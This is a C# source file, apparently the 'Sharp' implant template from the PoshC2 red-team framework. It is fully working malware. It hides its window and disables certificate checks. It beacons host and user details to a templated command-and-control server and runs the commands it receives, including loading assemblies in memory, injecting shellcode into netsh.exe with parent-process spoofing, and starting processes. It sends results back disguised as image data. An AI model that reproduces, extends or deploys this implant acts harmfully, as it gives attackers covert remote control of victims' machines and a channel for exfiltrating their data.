using System;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Reflection;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.IO.Compression;
using System.Collections.Generic;

//mono-csc /opt/PoshC2_Python_Git/Files/Sharp.cs -out:/tmp/Sharp.dll -target:library
//cat /tmp/Sharp.dll | base64 -w 0 | xclip

public class Program
{
  [DllImport("kernel32.dll")]
  static extern IntPtr GetConsoleWindow();
  [DllImport("user32.dll")]
  static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
  public const int SW_HIDE = 0;
  public const int SW_SHOW = 5;
  public static string scode = "";
  public static string proc = @"c:\windows\system32\netsh.exe";

  public static void Sharp()
  {
    var handle = GetConsoleWindow();
    ShowWindow(handle, SW_HIDE);
    AllowUntrustedCertificates();
    try	{ primer(); } catch {}
    Thread.Sleep(300000);
    try { primer(); } catch { }
    Thread.Sleep(600000);
    try { primer(); } catch { }
  }

  public static void Main()
  {
    Sharp();
  }
  
  static byte[] Combine(byte[] first, byte[] second)
  {
  	byte[] ret = new byte[first.Length + second.Length];
  	Buffer.BlockCopy(first, 0, ret, 0, first.Length);
  	Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
  	return ret;
  }

  static System.Net.WebClient GetWebRequest(string cookie)
  {
    var x = new System.Net.WebClient();
    
    string purl = "#REPLACEPROXYURL#";
    string puser = "#REPLACEPROXYUSER#";
    string ppass = "#REPLACEPROXYPASSWORD#";
    
    if (!String.IsNullOrEmpty(purl)) {
      WebProxy proxy = new WebProxy();
      proxy.Address = new Uri(purl);
      proxy.Credentials = new NetworkCredential(puser, ppass);
      proxy.UseDefaultCredentials = false;
      proxy.BypassProxyOnLocal = false;
      x.Proxy = proxy;
    }

    string df = "#REPLACEDF#";
    if (!String.IsNullOrEmpty(df)) {
      x.Headers.Add("Host",df);
    }

  	x.Headers.Add("User-Agent", "#REPLACEUSERAGENT#");
  	x.Headers.Add("Referer", "#REPLACEREFERER#");

  	if (cookie != null)
  	{
  		x.Headers.Add(System.Net.HttpRequestHeader.Cookie, $"SessionID={cookie}");
  	}
  	
  	return x;
  }

  static string Decryption(string key, string enc)
  {
  	var b = System.Convert.FromBase64String(enc);
  	Byte[] IV = new Byte[16];
  	Array.Copy(b, IV, 16);
  	try {
        var a = CAMR(key, System.Convert.ToBase64String(IV));
        var d = a.CreateDecryptor();
        var u = d.TransformFinalBlock(b, 16, b.Length - 16);
        return System.Text.Encoding.UTF8.GetString(u);
      } catch {
        var a = CAMA(key, System.Convert.ToBase64String(IV));
        var d = a.CreateDecryptor();
        var u = d.TransformFinalBlock(b, 16, b.Length - 16);
        return System.Text.Encoding.UTF8.GetString(u);
      }

  }

  static string Encryption(string key, string un, bool comp = false)
  {
  	var b = System.Text.Encoding.UTF8.GetBytes(un);
      byte[] byEnc = b;
      if (comp){
        byEnc = Compress(b);
      }
      try {
        var a = CAMR(key, null);
        var e = a.CreateEncryptor();
        var f = e.TransformFinalBlock(byEnc, 0, byEnc.Length);
        byte[] p = null;
        p = Combine(a.IV, f);
        return System.Convert.ToBase64String(p);
      } catch {
        var a = CAMA(key, null);
        var e = a.CreateEncryptor();
        var f = e.TransformFinalBlock(byEnc, 0, byEnc.Length);
        byte[] p = null;
        p = Combine(a.IV, f);
        return System.Convert.ToBase64String(p);
      }
  }

  static System.Security.Cryptography.AesCryptoServiceProvider CAMA(string key,string IV)
  {
    System.Security.Cryptography.AesCryptoServiceProvider b = new System.Security.Cryptography.AesCryptoServiceProvider();
    b.Mode = System.Security.Cryptography.CipherMode.CBC;
  	b.Padding = System.Security.Cryptography.PaddingMode.Zeros;
  	b.BlockSize = 128;
  	b.KeySize = 256;
  	
  	if (IV != null)
  	{
  		b.IV = System.Convert.FromBase64String(IV);
  	}
  	
  	if (key != null)
  	{
  		b.Key = System.Convert.FromBase64String(key);
  	}
  	
  	return b;
  }
  
  static System.Security.Cryptography.RijndaelManaged CAMR(string key,string IV)
  {
    System.Security.Cryptography.RijndaelManaged a = new System.Security.Cryptography.RijndaelManaged();
    a.Mode = System.Security.Cryptography.CipherMode.CBC;
  	a.Padding = System.Security.Cryptography.PaddingMode.Zeros;
  	a.BlockSize = 128;
  	a.KeySize = 256;
  	
  	if (IV != null)
  	{
  		a.IV = System.Convert.FromBase64String(IV);
  	}
  	
  	if (key != null)
  	{
  		a.Key = System.Convert.FromBase64String(key);
  	}
  	
  	return a;
  }

  static void AllowUntrustedCertificates()
  {
  	try
  	{
  		System.Net.ServicePointManager.ServerCertificateValidationCallback =  new System.Net.Security.RemoteCertificateValidationCallback(delegate { return true; } );
  	}
  	catch {	}
  }

  static void primer()
  {
    DateTime now = DateTime.Now;
    DateTime killDate = Convert.ToDateTime("#REPLACEKILLDATE#");
    if (killDate < now){
      System.Environment.Exit(1);
    }
        
		var u = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
		var dn = System.Environment.UserDomainName;
		var cn = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
		var arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
		int pid = Process.GetCurrentProcess().Id;
		Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
		string o = $"{dn};{u};{cn};{arch};{pid};#REPLACEBASEURL#";
		string key = "#REPLACEKEY#";
		var pp = Encryption(key, o);
		string baseURL = "#REPLACEBASEURL#";
		string s = "#REPLACESTARTURL#";
		var primer = GetWebRequest(pp).DownloadString(s);
		var x = Decryption(key, primer);

		Regex re = new Regex("RANDOMURI19901(.*)10991IRUMODNAR");
		Match m = re.Match(x);
		string RandomURI = m.Groups[1].ToString();

		re = new Regex("URLS10484390243(.*)34209348401SLRU");
		m = re.Match(x);
		string URLS = m.Groups[1].ToString();

		re = new Regex("KILLDATE1665(.*)5661ETADLLIK");
		m = re.Match(x);
		var KillDate = m.Groups[1].ToString();

		re = new Regex("SLEEP98001(.*)10089PEELS");
		m = re.Match(x);
		var Sleep = m.Groups[1].ToString();

		re = new Regex("NEWKEY8839394(.*)4939388YEKWEN");
		m = re.Match(x);
		var NewKey = m.Groups[1].ToString();

		re = new Regex("IMGS19459394(.*)49395491SGMI");
		m = re.Match(x);
		var IMGs = m.Groups[1].ToString();

		ImplantCore(baseURL, RandomURI, URLS, KillDate, Sleep, NewKey, IMGs);
  }
  
  static byte[] Compress(byte[] raw)
  {
    using (MemoryStream memory = new MemoryStream())
    {
      using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
      {
        gzip.Write(raw, 0, raw.Length);
      }
      return memory.ToArray();
    }
  }
  
  static byte[] GetImgData(byte[] cmdoutput, string[] stringnewIMGS)
  {
  	Random rnd = new Random();
  	string randimg = stringnewIMGS[rnd.Next(stringnewIMGS.Length)];
  	byte[] imgBytes = System.Convert.FromBase64String(randimg);
  	var maxByteslen = 1500;
  	var maxDatalen = 1500 + cmdoutput.Length;
  	var imageByteslen = imgBytes.Length;
  	var paddingByteslen = maxByteslen - imageByteslen;
  	var BytePadding = System.Text.Encoding.UTF8.GetBytes((RandomString(paddingByteslen)));
  	
    var ImageBytesFull = new byte[maxDatalen];
    System.Array.Copy(imgBytes, 0, ImageBytesFull, 0, imgBytes.Length);
    System.Array.Copy(BytePadding, 0, ImageBytesFull, imgBytes.Length, BytePadding.Length);
    System.Array.Copy(cmdoutput, 0, ImageBytesFull, imgBytes.Length + BytePadding.Length, cmdoutput.Length);
    return ImageBytesFull;
  }

  static Random random = new Random();
  
  static string RandomString(int length)
  {
  	const string chars = "...................@..........................Tyscf";
  	return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
  }

  static Type LoadSomething(string assemblyQualifiedName)
  {
  	// Throws exception is type was not found
  	return Type.GetType(
  		assemblyQualifiedName,
  		(name) =>
  		{
  			// Returns the assembly of the type by enumerating loaded assemblies
  			// in the app domain
  			return AppDomain.CurrentDomain.GetAssemblies().Where(z => z.FullName == name.FullName).FirstOrDefault();
  		},
  		null,
  		true);
  }
  
  static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS)
  {
    var re = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+");

    string strURLS = stringURLS.Replace(",","");
    var stringnewURLS = re.Matches(strURLS).Cast<Match>().Select(m => m.Value).ToArray();
    stringnewURLS = stringnewURLS.Where(m => !string.IsNullOrEmpty(m)).ToArray();

    string strIMGS = stringIMGS.Replace(",","");
    var stringnewIMGS = re.Matches(strIMGS).Cast<Match>().Select(m => m.Value).ToArray();
    stringnewIMGS = stringnewIMGS.Where(m => !string.IsNullOrEmpty(m)).ToArray();

    int beacontime = 5;
    
    if (!Int32.TryParse(Sleep, out beacontime))
    {
      beacontime = 5;
    }
    
  	while(true)
  	{
    	Random rnd = new Random();
  		string URL = stringnewURLS[rnd.Next(stringnewURLS.Length)];
      string G = (Guid.NewGuid()).ToString();
  		URL = baseURL+"/"+URL+G+"/?"+RandomURI;
      Thread.Sleep(beacontime*1000);
      
      DateTime now = DateTime.Now;
      DateTime killDate = Convert.ToDateTime(KillDate);
      if (killDate < now){
        System.Environment.Exit(1);
      }
      
  		var cmd = GetWebRequest(null).DownloadString(URL);
      string output = "";
  		try {
        string x = "";
  			try {
          x = Decryption(Key, cmd);
          x  = x.Replace("\0", string.Empty);
        } catch {}
        if (x.ToLower().StartsWith("multicmd"))
      	{
          string splitcmd = x.Replace("multicmd","");
      		string[] split = splitcmd.Split(new string[] {"!d-3dion@LD!-d"}, StringSplitOptions.RemoveEmptyEntries);
      		foreach (string c in split)
      		{
            output = "";
            //add download-file
            //add upload-file
            //add implant-core features, screenshot, tasklist, etc

            if (c.ToLower() == "pwd") {
              output =  Directory.GetCurrentDirectory();
            }
            
            if (c.ToLower().StartsWith("dir") || c.ToLower().StartsWith("ls")){
              string dirPath = "";
              var stringOutput = new StringWriter();
	            Console.SetOut(stringOutput);
              if (c.ToLower() == "dir" || c.ToLower() == "ls") {
                dirPath = Directory.GetCurrentDirectory();
              } else {
                dirPath = Regex.Replace(c, "dir ", "", RegexOptions.IgnoreCase);
                dirPath = Regex.Replace(c, "ls ", "", RegexOptions.IgnoreCase);
              }
              Console.WriteLine("Directory listing: {0} \r\n", dirPath);
              string[] folderPaths = Directory.GetDirectories(dirPath, "*", SearchOption.TopDirectoryOnly);
            	foreach (var f in folderPaths)
            	{
                try {
                Console.WriteLine("d-----  {0}", f.Normalize());
                }
                catch {}
            	}
              string[] filePaths = Directory.GetFiles(dirPath, "*", SearchOption.TopDirectoryOnly);
            	foreach (var f in filePaths)
            	{
                try {
                Console.WriteLine("------  {0}", f.Normalize());
                }
                catch {}
            	}
              output = stringOutput.ToString();
            }
                      
            // load and execute assembly in current app domain
            if (c.ToLower().StartsWith("loadmodule")){
              //var stringOutput = new StringWriter();
	            //Console.SetOut(stringOutput);
	            string module = Regex.Replace(c, "loadmodule", "", RegexOptions.IgnoreCase);
              Assembly assembly = System.Reflection.Assembly.Load(System.Convert.FromBase64String(module));
              //var pop = assembly.GetType("Seatbelt.Program").InvokeMember("UserChecks", BindingFlags.InvokeMethod, null, null, null);
              //output = stringOutput.ToString();
            }
            
            // list loaded assemblies
            if (c.ToLower().StartsWith("listmodules")){
              var appd = AppDomain.CurrentDomain.GetAssemblies();
              foreach (var ass in appd)
              {
              	output += ass.FullName.ToString() + "\n";
              }
            }
            
            if (c.ToLower().StartsWith("$shellcode")){
              string sc = c.Substring(13,c.Length - 13);
              sc = sc.Replace("\"", "");
              scode = sc;
            }
            
            if (c.ToLower().StartsWith("inject-shellcode")){
              
              string newProc = Regex.Replace(c, "inject-shellcode ", "", RegexOptions.IgnoreCase);
              newProc = Regex.Replace(newProc, "inject-shellcode", "", RegexOptions.IgnoreCase);
              if (!String.IsNullOrEmpty(newProc) && newProc.Length > 5) {
                 Program.proc = newProc;
              }
                            
              var stringOutput = new StringWriter();
              Console.SetOut(stringOutput);
              byte[] payload = Convert.FromBase64String(Program.scode);
              
              var loadedType = LoadSomething("PPIDSpoofer, Inject, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
              uint procID = (uint)loadedType.Assembly.GetType("PPIDSpoofer").InvokeMember("SharpCreateProcess", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] {  null, Program.proc, true}, null, null, null);
              var procShellcode = loadedType.Assembly.GetType("PPIDSpoofer").InvokeMember("InjectShellcode", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] {  (int)procID, payload}, null, null, null);
              output = stringOutput.ToString();
            
            }

            if (c.ToLower() == "ps"){
              var loadedType = LoadSomething("ProcHandler, Get-ProcessList, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
              var xxx = loadedType.Assembly.GetType("ProcHandler").InvokeMember("GetProcesses", BindingFlags.InvokeMethod, null, null, null);
              output = xxx.ToString();
            }
          
            // run loaded assemblies
            if (c.ToLower().StartsWith("run-exe")){
              string[] splitargs = c.Split(new string[] {" "}, StringSplitOptions.RemoveEmptyEntries);
              int i = 0;
              string splittheseargs = "";
              string qualifiedname = "";
              string name = "";
              foreach (string a in splitargs) {
                if (i == 1){
                  qualifiedname = a;
                }
                if (i == 2){
                  name = a;
                }
                if (i > 2){
                  splittheseargs = splittheseargs + " " + a;
                }
                i ++;
              }
              
              string[] splitnewargs = splittheseargs.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
              var myList = new List<string>();
              foreach (var arg in splitnewargs) {
                myList.Add(arg);
              }

            	var AppDomainAss = AppDomain.CurrentDomain.GetAssemblies();
            	foreach (var Ass in AppDomainAss)
            	{
            		if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
            		{
            			var stringOutput = new StringWriter();
            			Console.SetOut(stringOutput);
            			var loadedType = LoadSomething(qualifiedname + ", " + Ass.FullName);
                  try {
                      var xxx = loadedType.Assembly.EntryPoint.Invoke(null, new object[] { myList.ToArray() });
                      output = xxx.ToString() + stringOutput.ToString();
                  } catch (Exception e)  {
                      var xxx = e;
                      output = xxx.ToString() + stringOutput.ToString();
                  }
            		}
            	}
            }

            // run loaded assemblies
            if (c.ToLower().StartsWith("run-dll")){
              string[] splitargs = c.Split(new string[] {" "}, StringSplitOptions.RemoveEmptyEntries);
              string qualifiedname = splitargs[1];
            	string name = splitargs[2];
            	string method = splitargs[3];
            	var AppDomainAss = AppDomain.CurrentDomain.GetAssemblies();
            	foreach (var Ass in AppDomainAss)
            	{
            		if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
            		{
            			var stringOutput = new StringWriter();
            			Console.SetOut(stringOutput);
            			var loadedType = LoadSomething(qualifiedname + ", " + Ass.FullName);
                  try {
                      var xxx = loadedType.Assembly.GetType(qualifiedname).InvokeMember(method, BindingFlags.InvokeMethod, null, null, null);
                      output = xxx.ToString() + stringOutput.ToString();
                  } catch (Exception e)  {
                      var xxx = e;
                      output = xxx.ToString() + stringOutput.ToString();
                  }
            		}
            	}
            }
            
            // try to load another app domain and unload each time
            if (c.ToLower().StartsWith("loadmodule-appdomain")){
              var stringOutput = new StringWriter();
	            Console.SetOut(stringOutput);
	            string module = Regex.Replace(c, "loadmodule", "", RegexOptions.IgnoreCase);
              AppDomain dom = AppDomain.CreateDomain("RANDOM");
              Assembly assembly = dom.Load(System.Convert.FromBase64String(module));
              var pop = assembly.GetType("Seatbelt.Program").InvokeMember("UserChecks", BindingFlags.InvokeMethod, null, null, null);
              output = stringOutput.ToString();
              AppDomain.Unload(dom);
            }
  
            if (c.ToLower().StartsWith("exit")){
                System.Environment.Exit(1);
            }
            
            if (c.ToLower().StartsWith("start-process")){
              string proc = c.Replace("'", "");
              proc = proc.Replace("\"", "");
              string pstart = Regex.Replace(proc, "start-process ", "", RegexOptions.IgnoreCase);
              pstart = Regex.Replace(pstart, "-argumentlist(.*)", "", RegexOptions.IgnoreCase);
              string args = Regex.Replace(proc, "(.*)argumentlist ", "", RegexOptions.IgnoreCase);
              Process p = new Process();
              p.StartInfo.UseShellExecute = false;
              p.StartInfo.RedirectStandardOutput = true;
              p.StartInfo.RedirectStandardError = true;
              p.StartInfo.CreateNoWindow = true;
              p.StartInfo.FileName = pstart;
              p.StartInfo.Arguments = args;
              p.Start();
              output = p.StandardOutput.ReadToEnd();
              output = output + p.StandardError.ReadToEnd();
              p.WaitForExit();
            }
                      
            if (c.ToLower().StartsWith("setbeacon") || c.ToLower().StartsWith("beacon")) {
              string beacon = Regex.Replace(c, "setbeacon ", "", RegexOptions.IgnoreCase);
              beacon = Regex.Replace(beacon, "beacon ", "", RegexOptions.IgnoreCase);
            	if (beacon.ToLower().Contains("s"))
            	{
                beacon = Regex.Replace(beacon, "s", "", RegexOptions.IgnoreCase);
            		if (!Int32.TryParse(beacon, out beacontime))
            		{
            			beacontime = 5;
            		}
            	}
            	else if (beacon.ToLower().Contains("m"))
            	{
                    beacon = Regex.Replace(beacon, "m", "", RegexOptions.IgnoreCase);
            		if (!Int32.TryParse(beacon, out beacontime))
            		{
            			beacontime = 5;
            		}
            		beacontime = beacontime * 60;
            	}
            	else if (beacon.ToLower().Contains("h"))
            	{
            		beacon = Regex.Replace(beacon, "h", "", RegexOptions.IgnoreCase);
            		if (!Int32.TryParse(beacon, out beacontime))
            		{
            			beacontime = 5;
            		}
            		beacontime = beacontime * 60;
            		beacontime = beacontime * 60;
            	}
            	else if (!Int32.TryParse(beacon, out beacontime))
            	{
            		beacontime = 5;
            	}
            }

            URL = stringnewURLS[rnd.Next(stringnewURLS.Length)];
            G = (Guid.NewGuid()).ToString();
        		URL = baseURL+"/"+URL+G+"/?"+RandomURI;
            string task = Encryption(Key, c);
            string coutput = Encryption(Key, output, true);
            byte[] outputBytes = System.Convert.FromBase64String(coutput);
            byte[] sendBytes = GetImgData(outputBytes, stringnewIMGS);
            GetWebRequest(task).UploadData(URL, sendBytes);
        	}
        }
      } catch (Exception e) {
        URL = stringnewURLS[rnd.Next(stringnewURLS.Length)];
        URL = baseURL+"/"+URL+RandomURI;
        string task = Encryption(Key, "Error");
        string eroutput = Encryption(Key, "Error: " + output + e, true);
        byte[] outputBytes = System.Convert.FromBase64String(eroutput);
        byte[] sendBytes = GetImgData(outputBytes, stringnewIMGS);
        GetWebRequest(task).UploadData(URL, sendBytes);
  	  }
    }
  }
}
